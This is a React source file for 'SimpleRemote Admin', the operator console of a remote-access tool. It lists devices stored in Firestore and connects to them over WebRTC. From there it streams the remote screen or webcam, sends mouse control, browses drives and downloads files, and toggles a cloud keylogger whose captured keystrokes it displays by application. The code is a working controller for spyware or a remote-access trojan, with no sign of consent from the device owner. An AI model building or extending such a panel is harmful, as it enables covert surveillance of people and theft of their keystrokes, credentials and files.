import { useEffect, useState, useRef } from 'react';
import { db } from './firebase';
import { collection, onSnapshot, query, addDoc, updateDoc, doc, arrayUnion, orderBy, limit, where } from 'firebase/firestore';
import './App.css';

const servers = {
  iceServers: [
    { urls: ['stun:stun1.l.google.com:19302', 'stun:stun2.l.google.com:19302'] }
  ]
};

function App() {
  const [devices, setDevices] = useState([]);
  const [status, setStatus] = useState("Idle");
  const [currentDeviceId, setCurrentDeviceId] = useState(null);
  const [viewMode, setViewMode] = useState("screen"); // 'screen' | 'files' | 'keylogs'
  const [fileList, setFileList] = useState([]);
  const [keylogs, setKeylogs] = useState([]);
  const [currentPath, setCurrentPath] = useState("");
  const [isLoadingFiles, setIsLoadingFiles] = useState(false);
  const [isPaused, setIsPaused] = useState(false);
  const [isRecording, setIsRecording] = useState(false);
  const [screenSources, setScreenSources] = useState([]);
  const [showScreenSelector, setShowScreenSelector] = useState(false);
  const [rotation, setRotation] = useState(0);
  const [zoom, setZoom] = useState(1);
  const [isControlEnabled, setIsControlEnabled] = useState(false);

  const receivedBuffers = useRef({});
  const remoteStreamRef = useRef(null);
  const videoRef = useRef(null);
  const peerConnection = useRef(null);
  const dataChannelRef = useRef(null);

  useEffect(() => {
    if (viewMode === 'screen' && videoRef.current && remoteStreamRef.current) {
        videoRef.current.srcObject = remoteStreamRef.current;
    }
  }, [viewMode, status]);

  useEffect(() => {
    const q = query(collection(db, "devices"));
    const unsubscribe = onSnapshot(q, (snapshot) => {
      const devicesData = snapshot.docs.map(doc => ({
        id: doc.id,
        ...doc.data()
      }));
      setDevices(devicesData);
    });
    return () => unsubscribe();
  }, []);

  useEffect(() => {
      if (currentDeviceId) {
          const unsub = onSnapshot(doc(db, "devices", currentDeviceId), (snap) => {
              if (snap.exists()) {
                  setIsRecording(snap.data().isRecordingKeylogs || false);
              }
          });
          return () => unsub();
      }
  }, [currentDeviceId]);

  useEffect(() => {
      if (status === "Connected" && currentDeviceId && isRecording) {
          const q = query(collection(db, "keylogs"), orderBy("timestamp", "desc"), limit(100));
          const unsubscribe = onSnapshot(q, (snapshot) => {
              const logs = snapshot.docs
                  .map(doc => ({ id: doc.id, ...doc.data() }))
                  .filter(log => log.device_id === currentDeviceId);
              setKeylogs(logs);
          });
          return () => unsubscribe();
      } else {
          setKeylogs([]);
      }
  }, [status, currentDeviceId, isRecording]);

  const requestDrives = () => {
       if (dataChannelRef.current && dataChannelRef.current.readyState === 'open') {
          setIsLoadingFiles(true);
          dataChannelRef.current.send(JSON.stringify({ type: "FS_GET_DRIVES" }));
      }
  };

  const requestFiles = (path) => {
      if (isLoadingFiles) return;
      if (dataChannelRef.current && dataChannelRef.current.readyState === 'open') {
          setIsLoadingFiles(true);
          dataChannelRef.current.send(JSON.stringify({ type: "FS_LIST_REQUEST", path }));
      }
  };

  const requestDownload = (fileName) => {
      const filePath = currentPath + "\\" + fileName;
      if (dataChannelRef.current && dataChannelRef.current.readyState === 'open') {
          console.log("Requesting download:", filePath);
          dataChannelRef.current.send(JSON.stringify({ type: "FS_DOWNLOAD_START", filePath }));
      }
  };

  const requestScreenSources = () => {
       if (dataChannelRef.current && dataChannelRef.current.readyState === 'open') {
          dataChannelRef.current.send(JSON.stringify({ type: "GET_SCREEN_SOURCES" }));
      }
  };

  const switchSource = (mode, sourceId = null) => {
      if (dataChannelRef.current && dataChannelRef.current.readyState === 'open') {
          dataChannelRef.current.send(JSON.stringify({ type: "SWITCH_SOURCE", mode, sourceId }));
          setShowScreenSelector(false); // Close selector if open
      }
  };
  
  const togglePause = () => {
      if (videoRef.current) {
          if (videoRef.current.paused) {
              videoRef.current.play();
              setIsPaused(false);
          } else {
              videoRef.current.pause();
              setIsPaused(true);
          }
      }
  };

  const toggleRecording = async () => {
      if (!currentDeviceId) return;
      await updateDoc(doc(db, "devices", currentDeviceId), {
          isRecordingKeylogs: !isRecording
      });
  };

  const disconnect = () => {
      if (peerConnection.current) {
          peerConnection.current.close();
      }
      setStatus("Idle");
      setViewMode("screen");
      setIsPaused(false);
      setRotation(0);
      setZoom(1);
      setIsControlEnabled(false);
      setCurrentDeviceId(null);
  };

  const startConnection = async (deviceId) => {
      setCurrentDeviceId(deviceId);
      try {
        setStatus("Connecting to " + deviceId);
        if (peerConnection.current) peerConnection.current.close();

        const pc = new RTCPeerConnection(servers);
        peerConnection.current = pc;

        // Handle Tracks (Video)
        pc.ontrack = (event) => {
            console.log("Track received:", event);
            remoteStreamRef.current = event.streams[0];
            if (videoRef.current) {
                videoRef.current.srcObject = event.streams[0];
                setStatus("Connected");
            }
        };

        // Create Data Channel
        const dataChannel = pc.createDataChannel("control");
        dataChannelRef.current = dataChannel;
        
        dataChannel.onopen = () => {
            console.log("Data channel open");
            setStatus("Connected"); // Enable UI when data channel is ready
            // Request initial file list
            requestFiles("C:\\");
        };

        dataChannel.onmessage = (event) => {
            try {
                const msg = JSON.parse(event.data);
                if (msg.type === "FS_LIST_RESPONSE") {
                    setFileList(msg.content);
                    setCurrentPath(msg.path);
                    setIsLoadingFiles(false);
                } else if (msg.type === "SCREEN_SOURCES_RESPONSE") {
                    setScreenSources(msg.sources);
                    setShowScreenSelector(true);
                } else if (msg.type === "FILE_CHUNK") {
                    if (!receivedBuffers.current[msg.filePath]) {
                        receivedBuffers.current[msg.filePath] = [];
                    }
                    receivedBuffers.current[msg.filePath].push(msg.data);
                } else if (msg.type === "FILE_END") {
                    const buffers = receivedBuffers.current[msg.filePath];
                    if (buffers) {
                        const base64 = buffers.join("");
                        const binaryString = window.atob(base64);
                        const len = binaryString.length;
                        const bytes = new Uint8Array(len);
                        for (let i = 0; i < len; i++) {
                            bytes[i] = binaryString.charCodeAt(i);
                        }
                        const blob = new Blob([bytes], { type: "application/octet-stream" });
                        const url = URL.createObjectURL(blob);
                        const a = document.createElement('a');
                        a.href = url;
                        a.download = msg.filePath.split('\\').pop();
                        document.body.appendChild(a);
                        a.click();
                        document.body.removeChild(a);
                        URL.revokeObjectURL(url);
                        delete receivedBuffers.current[msg.filePath];
                    }
                } else if (msg.type === "ERROR") {
                    alert(msg.message);
                    setIsLoadingFiles(false);
                }
            } catch (e) {}
        };

        // Ensure we request video
        pc.addTransceiver('video', { direction: 'recvonly' });

        // Create Offer
        const offer = await pc.createOffer();
        await pc.setLocalDescription(offer);

        // Create Session Doc
        const sessionRef = await addDoc(collection(db, "sessions"), {
            deviceId: deviceId,
            offer: { type: offer.type, sdp: offer.sdp },
            ice_candidates_caller: [],
            ice_candidates_callee: []
        });
        
        // Handle ICE Candidates (Send to Firestore)
        pc.onicecandidate = async (event) => {
            if (event.candidate) {
                await updateDoc(sessionRef, {
                    ice_candidates_caller: arrayUnion(event.candidate.toJSON())
                });
            }
        };

        // Listen for Answer and ICE from Callee
        onSnapshot(sessionRef, (docSnap) => {
            const data = docSnap.data();
            if (!data) return;

            if (data.answer && !pc.currentRemoteDescription) {
                const answer = new RTCSessionDescription(data.answer);
                pc.setRemoteDescription(answer);
            }
            
            if (data.ice_candidates_callee) {
                data.ice_candidates_callee.forEach(candidate => {
                     try { pc.addIceCandidate(new RTCIceCandidate(candidate)); } catch (e) {}
                });
            }
        });
      } catch (err) {
        console.error("Connection failed:", err);
        setStatus("Connection Failed: " + err.message);
      }
  };

  return (
    <div className="app-container">
      <header className="app-header">
        <div className="brand">
            <h1>SimpleRemote Admin</h1>
        </div>
        <div className="header-controls">
            <span className={`status-indicator status-${status.toLowerCase().split(' ')[0]}`}>
                {status}
            </span>
            {status === "Connected" && (
                <button className="disconnect-btn" onClick={disconnect}>Disconnect</button>
            )}
        </div>
      </header>

      <div className="main-layout">
        {status === "Connected" && (
            <aside className="sidebar">
                <button className={viewMode === 'screen' ? 'active' : ''} onClick={() => setViewMode("screen")}>
                    🖥️ Remote View
                </button>
                <button className={viewMode === 'files' ? 'active' : ''} onClick={() => setViewMode("files")}>
                    📂 Files
                </button>
                <button className={viewMode === 'keylogs' ? 'active' : ''} onClick={() => setViewMode("keylogs")}>
                    ⌨️ Keylogs
                </button>
            </aside>
        )}

        <main className="content-area">
            {status !== "Connected" ? (
                <div className="devices-grid">
                    {devices.map(device => (
                        <div key={device.id} className="device-card">
                            <div className="device-icon">💻</div>
                            <div className="device-info">
                                <h3>{device.name || "Unknown Device"}</h3>
                                <p>{device.specs?.platform} - {device.id.substring(0, 8)}</p>
                            </div>
                            <button className="connect-btn" onClick={() => startConnection(device.id)}>Connect</button>
                        </div>
                    ))}
                    {devices.length === 0 && <p className="no-devices">No devices online.</p>}
                </div>
            ) : (
                <>
                    {viewMode === "screen" && (
                        <div className="video-workspace">
                            <div className="toolbar">
                                <div className="btn-group">
                                    <button onClick={() => switchSource('screen')}>Default Screen</button>
                                    <button onClick={requestScreenSources}>Switch Screen ▾</button>
                                    <button onClick={() => switchSource('webcam')}>Webcam</button>
                                </div>
                                <div className="btn-group">
                                    <button onClick={() => setRotation(r => (r + 90) % 360)}>↻ Rotate</button>
                                    <button onClick={() => setZoom(z => Math.max(0.5, z - 0.1))}>-</button>
                                    <span style={{color: 'white', alignSelf: 'center', margin: '0 5px'}}>{Math.round(zoom * 100)}%</span>
                                    <button onClick={() => setZoom(z => z + 0.1)}>+</button>
                                    <button onClick={() => { setZoom(1); setRotation(0); }}>Reset</button>
                                    <button onClick={togglePause}>{isPaused ? "▶ Resume" : "⏸ Pause"}</button>
                                    <button onClick={() => setIsControlEnabled(prev => !prev)} style={{ backgroundColor: isControlEnabled ? '#4caf50' : '#3e3e42', border: isControlEnabled ? '1px solid #45a049' : '1px solid #555' }}>
                                        {isControlEnabled ? "🎮 Control On" : "🎮 Control Off"}
                                    </button>
                                </div>
                            </div>
                            
                            {showScreenSelector && (
                                <div className="screen-selector-modal">
                                    <h3>Select Screen</h3>
                                    <div className="screen-list">
                                        {screenSources.map(s => (
                                            <div key={s.id} className="screen-option" onClick={() => switchSource('screen', s.id)}>
                                                <span>🖥️ {s.name}</span>
                                            </div>
                                        ))}
                                    </div>
                                    <button className="close-modal" onClick={() => setShowScreenSelector(false)}>Cancel</button>
                                </div>
                            )}

                            <div className="video-container">
                                <video 
                                    ref={videoRef} 
                                    autoPlay 
                                    playsInline 
                                    controls={false}
                                    className="remote-video"
                                    style={{
                                        transform: `rotate(${rotation}deg) scale(${zoom})`,
                                        transition: 'transform 0.2s ease',
                                        cursor: isControlEnabled ? 'crosshair' : 'default'
                                    }}
                                    onMouseMove={(e) => {
                                        if (!isControlEnabled) return;
                                        const videoElement = videoRef.current;
                                        if (videoElement && dataChannelRef.current && dataChannelRef.current.readyState === 'open') {
                                            const rect = videoElement.getBoundingClientRect();
                                            const x = (e.clientX - rect.left) / rect.width;
                                            const y = (e.clientY - rect.top) / rect.height;
                                            dataChannelRef.current.send(JSON.stringify({ type: "MOUSE_MOVE", x, y }));
                                        }
                                    }}
                                    onClick={(e) => {
                                        if (!isControlEnabled) return;
                                        const videoElement = videoRef.current;
                                        if (videoElement && dataChannelRef.current && dataChannelRef.current.readyState === 'open') {
                                            const button = e.button === 0 ? "left" : (e.button === 2 ? "right" : "middle");
                                            dataChannelRef.current.send(JSON.stringify({ type: "MOUSE_CLICK", button }));
                                        }
                                    }}
                                ></video>
                            </div>
                        </div>
                    )}

                    {viewMode === "files" && (
                        <div className="file-manager">
                            <div className="file-header">
                                <h3>File Explorer</h3>
                                <div className="path-bar">
                                    <button onClick={requestDrives} style={{marginRight: '10px', padding: '2px 8px', cursor: 'pointer'}}>🖥️ This PC</button>
                                    <span>{currentPath}</span>
                                    {isLoadingFiles && <span className="loading-spinner"> ⏳</span>}
                                </div>
                            </div>
                            <div className="file-list">
                                <div className="file-item directory" onClick={() => requestFiles(currentPath + "\\..")}>
                                     📁 .. (Parent)
                                </div>
                                {fileList.map((f, i) => (
                                    <div 
                                        key={i} 
                                        className={`file-item ${f.isDir ? 'directory' : 'file'}`} 
                                        onClick={() => f.isDir ? requestFiles(currentPath + "\\" + f.name) : requestDownload(f.name)}
                                    >
                                        <span className="icon">{f.isDir ? "📁" : "📄"}</span>
                                        <span className="name">{f.name}</span>
                                        <span className="size">{f.size ? `${(f.size/1024).toFixed(1)} KB` : ""}</span>
                                    </div>
                                ))}
                            </div>
                        </div>
                    )}

                    {viewMode === "keylogs" && (
                        <div className="keylogs-viewer">
                            <div style={{display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginBottom: '15px', borderBottom: '1px solid #333', paddingBottom: '10px'}}>
                                <h3 style={{margin: 0}}>Keylogs</h3>
                                <div style={{display: 'flex', alignItems: 'center', gap: '10px'}}>
                                    <span style={{color: isRecording ? '#f44336' : '#666'}}>
                                        {isRecording ? "● Recording to Cloud" : "○ Idle (Local Only)"}
                                    </span>
                                    <button 
                                        onClick={toggleRecording}
                                        style={{
                                            backgroundColor: isRecording ? '#d32f2f' : '#4caf50', 
                                            color: 'white', 
                                            border: 'none', 
                                            padding: '6px 12px', 
                                            borderRadius: '4px', 
                                            cursor: 'pointer'
                                        }}
                                    >
                                        {isRecording ? "⏹ Stop Recording" : "🔴 Start Recording"}
                                    </button>
                                </div>
                            </div>
                            
                            <div className="logs-table-container">
                                <table className="logs-table">
                                    <thead>
                                        <tr>
                                            <th>Time</th>
                                            <th>App</th>
                                            <th>Trigger</th>
                                            <th>Content</th>
                                        </tr>
                                    </thead>
                                    <tbody>
                                        {keylogs.map(log => (
                                            <tr key={log.id}>
                                                <td className="time-col">{log.timestamp?.toDate().toLocaleTimeString()}</td>
                                                <td className="app-col">{log.app_name || "Unknown"}</td>
                                                <td className="trigger-col">{log.trigger}</td>
                                                <td className="content-col">{log.content}</td>
                                            </tr>
                                        ))}
                                    </tbody>
                                </table>
                                {keylogs.length === 0 && <p className="no-logs">{isRecording ? "Waiting for logs..." : "Recording stopped. Logs are saved locally on the device."}</p>}
                            </div>
                        </div>
                    )}
                </>
            )}
        </main>
      </div>
    </div>
  );
}

export default App;
